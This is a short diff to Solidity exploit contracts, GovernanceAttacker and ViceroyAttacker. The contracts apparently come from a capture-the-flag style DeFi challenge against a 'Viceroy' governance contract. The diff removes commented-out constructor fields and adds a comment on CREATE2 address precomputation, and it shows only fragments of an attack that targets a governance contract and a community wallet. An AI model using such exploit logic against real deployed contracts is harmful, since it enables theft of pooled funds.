@@ -6,17 +6,11 @@ import {Governance} from "@main/Viceroy.sol";
 contract GovernanceAttacker {
 
     address attacker;
-    // address governance;
-    // address communityWallet;
 
     constructor(
         address _attacker
-        // address _governance,
-        // address _communityWallet
     ) {
         attacker = _attacker;
-        // governance = _governance;
-        // communityWallet = _communityWallet;
     }
 
     function attack(address _governance, address _communityWallet) external {
@@ -77,7 +71,9 @@ contract ViceroyAttacker {
                 bytecode,
                 abi.encode(_governance, proposalId, address(this))
             );
-            // get hash & address
+            // get hash & address 
+            //  keccak256( 0xff ++ senderAddress ++ salt ++ keccak256(init_code))
+
             bytes32 hash = keccak256(
                 abi.encodePacked(
                     bytes1(0xff),
